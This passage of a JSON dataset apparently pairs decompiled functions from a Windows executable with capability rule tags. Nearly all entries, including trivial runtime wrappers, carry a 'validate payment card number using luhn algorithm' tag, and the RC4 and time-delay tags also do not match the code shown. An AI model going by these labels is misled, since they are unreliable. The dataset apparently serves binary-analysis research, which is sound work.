        "decompiled_code": "\nvoid __cdecl fcn.00401a46(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint32_t arg_1ch)\n\n{\n    fcn.00403f03(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0, arg_1ch & 0xffff);\n    return;\n}\n",
        "token_count": 95
    },
    "00401a4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401a4b(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar1 = fcn.00403387(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 229
    },
    "00401a96": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401a96(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    pcVar1 = fcn.004ca267(7, \"GetActiveWindow\", 0x55961c, 0x559624);\n    if (pcVar1 != NULL) {\n        (**0x578000)();\n        iVar2 = (*pcVar1)();\n        if (iVar2 != 0) {\n            pcVar1 = fcn.004ca267(10, \"GetLastActivePopup\", 0x559688, 0x559690);\n            if (pcVar1 == NULL) {\n                return iVar2;\n            }\n            (**0x578000)(iVar2);\n            iVar2 = (*pcVar1)();\n            return iVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 180
    },
    "00401ac3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401ac3(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.00406064(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 190
    },
    "00401ac8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401ac8(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 24
    },
    "00401ad2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ad2(uint arg_8h)\n\n{\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403b02();\n    return;\n}\n",
        "token_count": 53
    },
    "00401af5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401af5(uint param_1)\n\n{\n    uint var_4h;\n    \n    return param_1;\n}\n",
        "token_count": 32
    },
    "00401b09": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401b09(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 24
    },
    "00401b54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nfloat10 __cdecl fcn.00401b54(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403b02(0x1a3);\n    return *0x4ec2c4;\n}\n",
        "token_count": 77
    },
    "00401b59": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00401b59(float noname_0, uint arg_ch)\n\n{\n    float10 fVar1;\n    \n    fVar1 = fcn.00402bf3(SUB84(noname_0, 0), noname_0 >> 0x20, arg_ch);\n    return fVar1;\n}\n",
        "token_count": 74
    },
    "00401b63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401b63(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    arg_8h = *(arg_8h + 0x3c) + arg_8h;\n    iVar1 = *(arg_8h + 0x14) + 0x18 + arg_8h;\n    if (*(arg_8h + 6) != 0) {\n        do {\n            if ((*(iVar1 + 0xc) <= arg_ch) && (arg_ch < *(iVar1 + 8) + *(iVar1 + 0xc))) {\n                return iVar1;\n            }\n            uVar2 = uVar2 + 1;\n            iVar1 = iVar1 + 0x28;\n        } while (uVar2 < *(arg_8h + 6));\n    }\n    return 0;\n}\n",
        "token_count": 214
    },
    "00401b68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401b68(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00406087();\n    return iVar1 + arg_8h;\n}\n",
        "token_count": 59
    },
    "00401b86": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401b86(code **arg_8h, code **arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    do {\n        if (arg_8h == arg_ch) {\n            return 0;\n        }\n        pcVar1 = *arg_8h;\n        if (pcVar1 != NULL) {\n            (**0x578000)();\n            iVar2 = (*pcVar1)();\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n        arg_8h = arg_8h + 1;\n    } while( true );\n}\n",
        "token_count": 140
    },
    "00401bc7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401bc7(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint *puVar1;\n    uint *puVar2;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401d98(arg_8h);\n    puVar1 = fcn.0040571d(arg_8h_00);\n    puVar2 = fcn.004016b8(arg_ch);\n    *puVar1 = *puVar2;\n    return;\n}\n",
        "token_count": 122
    },
    "00401c67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nfloat10 __cdecl fcn.00401c67(uint arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403b02(&stack0x0000002c, &stack0x00000048, &stack0x00000060, &stack0x00000078);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    return *0x546fc4;\n}\n",
        "token_count": 202
    },
    "00401ccb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00401ccb(int32_t param_1)\n\n{\n    *(param_1 + 0x3c) = 1;\n    fcn.004016ae(*(param_1 + 0x32), param_1 + 0x18);\n    return 1;\n}\n",
        "token_count": 66
    },
    "00401cda": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401cda(code *arg_8h, uint arg_ch)\n\n{\n    code **in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    *in_ECX = vtable.std::exception.0;\n    fcn.00403189(in_ECX + 1, 0, 8);\n    in_ECX[1] = arg_8h;\n    return;\n}\n",
        "token_count": 96
    },
    "00401ce9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ce9(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection * 0x18 + 0x575068);\n    return;\n}\n",
        "token_count": 49
    },
    "00401d02": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401d02(uint arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = arg_8h;\n    in_ECX[1] = arg_ch;\n    return;\n}\n",
        "token_count": 63
    },
    "00401d11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401d11(int16_t *arg_8h)\n\n{\n    if (((*arg_8h == 0x5a4d) && (*(*(arg_8h + 0x1e) + arg_8h) == 0x4550)) && (*(*(arg_8h + 0x1e) + arg_8h + 6) == 0x10b)\n       ) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 111
    },
    "0040230b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040230b(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (arg_10h != 0) {\n        do {\n            uVar1 = *arg_8h;\n            if (uVar1 - 0x41 < 0x1a) {\n                uVar1 = uVar1 + 0x20;\n            }\n            uVar2 = *arg_ch;\n            arg_8h = arg_8h + 1;\n            if (uVar2 - 0x41 < 0x1a) {\n                uVar2 = uVar2 + 0x20;\n            }\n            arg_ch = arg_ch + 1;\n        } while (((uVar1 - uVar2 == 0) && (uVar1 != 0)) && (arg_10h = arg_10h + -1,  arg_10h != 0));\n        return uVar1 - uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 250
    },
    "00401d93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00401d93(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    fcn.00405830(arg_8h, arg_ch, arg_14h * 2);\n    fcn.00404ce1(arg_14h * 2 + arg_8h, arg_1ch, arg_18h);\n    fcn.00405830(arg_8h + (arg_14h + arg_18h) * 2, arg_ch + arg_14h * 2, (arg_10h - arg_14h) * 2 + 2);\n    return;\n}\n",
        "token_count": 170
    },
    "00401dca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00401dca(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t lpCriticalSection;\n    \n    lpCriticalSection = 0x574428;\n    uVar2 = 0;\n    do {\n        iVar1 = fcn.004046d8(lpCriticalSection, 4000, 0);\n        if (iVar1 == 0) {\n            fcn.00405051();\n            return 0;\n        }\n        *0x574440 = *0x574440 + 1;\n        uVar2 = uVar2 + 0x18;\n        lpCriticalSection = lpCriticalSection + 0x18;\n    } while (uVar2 < 0x18);\n    return 1;\n}\n",
        "token_count": 163
    },
    "00401dd9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401dd9(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t var_4h;\n    \n    uVar3 = arg_8h & 0xffff;\n    uVar1 = 0;\n    uVar2 = uVar3;\n    if (uVar2 != 0xffff) {\n        if ((*(arg_ch + 0xc) == 0) && (uVar2 < 0x100)) {\n            uVar1 = uVar3 - 0x41;\n            if (uVar1 < 0x1a) {\n                uVar3 = uVar2 + 0x20;\n            }\n        }\n        else {\n            var_4h = uVar3;\n            uVar1 = fcn.0040466a(*(arg_ch + 0xc), 0x100, &arg_8h, 1, &var_4h, 1);\n            uVar3 = arg_8h & 0xffff;\n            if (uVar1 != 0) {\n                uVar3 = var_4h & 0xffff;\n            }\n        }\n    }\n    return uVar1 & 0xffff0000 | uVar3;\n}\n",
        "token_count": 296
    },
    "00401e01": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00401e01(uint *arg_8h)\n\n{\n    char *var_8h;\n    uint var_4h;\n    \n    if ((((**0x574458 != '\\0') && (**0x574458 == '_')) && ((*0x574458)[1] != '\\0')) && ((*0x574458)[1] == 'E')) {\n        *0x574458 = *0x574458 + 2;\n        var_8h = \" noexcept\";\n        var_4h = 9;\n        fcn.00402d47(&var_8h);\n        return arg_8h;\n    }\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    return arg_8h;\n}\n",
        "token_count": 171
    },
    "00401e1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401e1a(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (in_ECX[5] - iVar1 < arg_ch) {\n        fcn.00403dfa(arg_ch, in_ECX, arg_8h, arg_ch);\n    }\n    else {\n        in_ECX[4] = iVar1 + arg_ch;\n        if (7 < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        fcn.004059ac(in_ECX + iVar1 * 2, arg_8h, arg_ch * 2);\n        *(in_ECX + (iVar1 + arg_ch) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00401ece": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ece(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 42
    },
    "00401ed3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ed3(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint32_t arg_ch;\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < 0x7fffffff) {\n        arg_ch = in_ECX[5];\n        iVar2 = fcn.004035b7(arg_8h, arg_ch, 0x7ffffffe);\n        arg_8h_00 = fcn.00404480(iVar2 + 1);\n        in_ECX[4] = arg_8h;\n        in_ECX[5] = iVar2;\n        fcn.00404ce1(arg_8h_00, arg_10h, arg_8h);\n        *(arg_8h_00 + arg_8h * 2) = 0;\n        if (7 < arg_ch) {\n            fcn.00401654(*in_ECX, arg_ch * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.0040393b();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 309
    },
    "00401ee2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00401ee2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    fcn.00495fbf(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return;\n}\n",
        "token_count": 97
    },
    "00401ee7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401ee7(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.00402ca2(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 195
    },
    "00401f0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401f0f(int16_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    uint *puVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t arg_8h_00;\n    int32_t arg_ch_00;\n    uint uVar9;\n    int16_t *piVar10;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar5 = fcn.00403a35();\n        *puVar5 = 0x16;\n        return 0xffffffff;\n    }\n    piVar6 = fcn.004050f6(arg_8h, 0x3d);\n    piVar10 = arg_8h;\n    if ((piVar6 == NULL) || (piVar6 == arg_8h)) {\ncode_r0x004c94ba:\n        puVar5 = fcn.00403a35();\n        *puVar5 = 0x16;\n    }\n    else {\n        iVar3 = piVar6[1];\n        fcn.004c975e();\n        uVar9 = 0;\n        if (*0x574890 == NULL) {\n            if ((arg_ch == 0) || (*0x57488c == 0)) {\n                if (iVar3 == 0) {\n                    uVar9 = 0;\n                    goto code_r0x004c94c8;\n                }\n                if (*0x57488c == 0) {\n                    *0x57488c = fcn.00405088(1, 4);\n                    fcn.0040640b(0);\n                    if (*0x57488c == 0) goto code_r0x004c94c5;\n                    if (*0x574890 != NULL) goto code_r0x004c9378;\n                }\n                *0x574890 = fcn.00405088(1, 4);\n                fcn.0040640b(0);\n            }\n            else {\n                iVar7 = fcn.00404296();\n                if (iVar7 == 0) goto code_r0x004c94ba;\n                fcn.004c975e();\n            }\n            if (*0x574890 == NULL) goto code_r0x004c94c5;\n        }\ncode_r0x004c9378:\n        piVar8 = *0x574890;\n        arg_ch_00 = piVar6 - arg_8h >> 1;\n        iVar7 = fcn.004c97e8(arg_8h, arg_ch_00);\n        if ((-1 < iVar7) && (*piVar8 != 0)) {\n            fcn.0040640b(piVar8[iVar7]);\n            if (iVar3 == 0) {\n                for (; piVar8[iVar7] != 0; iVar7 = iVar7 + 1) {\n                    piVar8[iVar7] = piVar8[iVar7 + 1];\n                }\n                piVar8 = fcn.00402cfc(piVar8, iVar7, 4);\n                fcn.0040640b(0);\n                if (piVar8 != NULL) {\ncode_r0x004c9431:\n                    *0x574890 = piVar8;\n                }\n            }\n            else {\n                piVar8[iVar7] = arg_8h;\n                piVar10 = NULL;\n            }\n            if (arg_ch != 0) {\n                piVar6 = arg_8h;\n                do {\n                    iVar2 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                } while (iVar2 != 0);\n                iVar7 = (piVar6 - (arg_8h + 1) >> 1) + 2;\n                arg_8h_00 = fcn.00405088(iVar7, 2);\n                if (arg_8h_00 != 0) {\n                    iVar7 = fcn.00403977(arg_8h_00, iVar7, arg_8h);\n                    if (iVar7 != 0) {\n                        fcn.0040366b(0, 0, 0, 0, 0);\n                        pcVar4 = swi(3);\n                        uVar9 = (*pcVar4)();\n                        return uVar9;\n                    }\n                    uVar1 = arg_8h_00 + (arg_ch_00 + 1) * 2;\n                    *(uVar1 - 2) = 0;\n                    iVar7 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(arg_8h_00, -(iVar3 != 0) & uVar1);\n                    if (iVar7 == 0) {\n                        puVar5 = fcn.00403a35();\n                        uVar9 = 0xffffffff;\n                        *puVar5 = 0x2a;\n                    }\n                }\n                fcn.0040640b(arg_8h_00);\n            }\n            goto code_r0x004c94c8;\n        }\n        if (iVar3 == 0) goto code_r0x004c94c8;\n        uVar1 = -iVar7 + 2;\n        if ((-iVar7 <= uVar1) && (uVar1 < 0x3fffffff)) {\n            piVar8 = fcn.00402cfc(piVar8, uVar1, 4);\n            fcn.0040640b(0);\n            if (piVar8 != NULL) {\n                piVar8[-iVar7] = arg_8h;\n                piVar8[1 - iVar7] = 0;\n                piVar10 = NULL;\n                goto code_r0x004c9431;\n            }\n        }\n    }\ncode_r0x004c94c5:\n    uVar9 = 0xffffffff;\ncode_r0x004c94c8:\n    fcn.0040640b(piVar10);\n    return uVar9;\n}\n",
        "token_count": 1356
    },
    "00401f3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401f3c(int32_t param_1)\n\n{\n    uchar var_9h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0xf;\n    var_9h = 0;\n    var_8h = param_1;\n    var_4h = param_1;\n    fcn.00405e0c(param_1, &var_9h);\n    return;\n}\n",
        "token_count": 129
    },
    "00401f87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401f87(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00403495(arg_ch);\n    return;\n}\n",
        "token_count": 36
    },
    "00401f8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401f8c(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uchar var_5h;\n    uint var_4h;\n    \n    fcn.0040595c(arg_8h, arg_ch, arg_10h);\n    fcn.0040146f(arg_8h + arg_10h, arg_14h, arg_18h);\n    var_5h = 0;\n    fcn.00405e0c(arg_8h + arg_10h + arg_14h, &var_5h);\n    return;\n}\n",
        "token_count": 154
    },
    "00401fff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401fff(uint param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x4270c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 7;\n    fcn.00406695(param_1);\n    fcn.00402c98();\n    fcn.00402c98();\n    fcn.004029c8();\n    fcn.004029c8();\n    fcn.00402c98();\n    fcn.00402c98();\n    fcn.004036f2();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 205
    },
    "00402022": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402022(int32_t param_1)\n\n{\n    fcn.00404179(*(param_1 + 8));\n    fcn.00404179(*(param_1 + 0xc));\n    fcn.00404179(*(param_1 + 0x10));\n    return;\n}\n",
        "token_count": 70
    },
    "00402068": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402068(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00403c9c(arg_8h, arg_8h + 0x38, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 85
    },
    "004020e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004020e5(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_10h == 1) {\n        uVar2 = *arg_8h;\n        uVar1 = *arg_ch;\n    }\n    else if (arg_10h == 2) {\n        iVar3 = *arg_8h - *arg_ch;\n        if (iVar3 != 0) goto code_r0x004876d7;\n        uVar2 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n    }\n    else if (arg_10h == 3) {\n        iVar3 = *arg_8h - *arg_ch;\n        if ((iVar3 != 0) || (iVar3 = *(arg_8h + 1) - *(arg_ch + 1),  iVar3 != 0)) goto code_r0x004876d7;\n        uVar2 = *(arg_8h + 2);\n        uVar1 = *(arg_ch + 2);\n    }\n    else {\n        if (arg_10h != 4) {\n            if (0x1f < arg_10h) {\n                do {\n                    if (*arg_8h != *arg_ch) {\n                        iVar3 = (*arg_8h & 0xff) - *arg_ch;\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 1) - *(arg_ch + 1),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 2) - *(arg_ch + 2),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 3) - *(arg_ch + 3);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[1] != arg_ch[1]) {\n                        iVar3 = (arg_8h[1] & 0xff) - *(arg_ch + 1);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 5) - *(arg_ch + 5),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 6) - *(arg_ch + 6),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 7) - *(arg_ch + 7);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[2] != arg_ch[2]) {\n                        iVar3 = (arg_8h[2] & 0xff) - *(arg_ch + 2);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 9) - *(arg_ch + 9),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 10) - *(arg_ch + 10),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 0xb) - *(arg_ch + 0xb);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[3] != arg_ch[3]) {\n                        iVar3 = (arg_8h[3] & 0xff) - *(arg_ch + 3);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 0xd) - *(arg_ch + 0xd),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 0xe) - *(arg_ch + 0xe),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 0xf) - *(arg_ch + 0xf);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[4] != arg_ch[4]) {\n                        iVar3 = *(arg_8h + 4) - *(arg_ch + 4);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 0x11) - *(arg_ch + 0x11),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 0x12) - *(arg_ch + 0x12),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 0x13) - *(arg_ch + 0x13);\n                            if (iVar3 != 0) {\n                                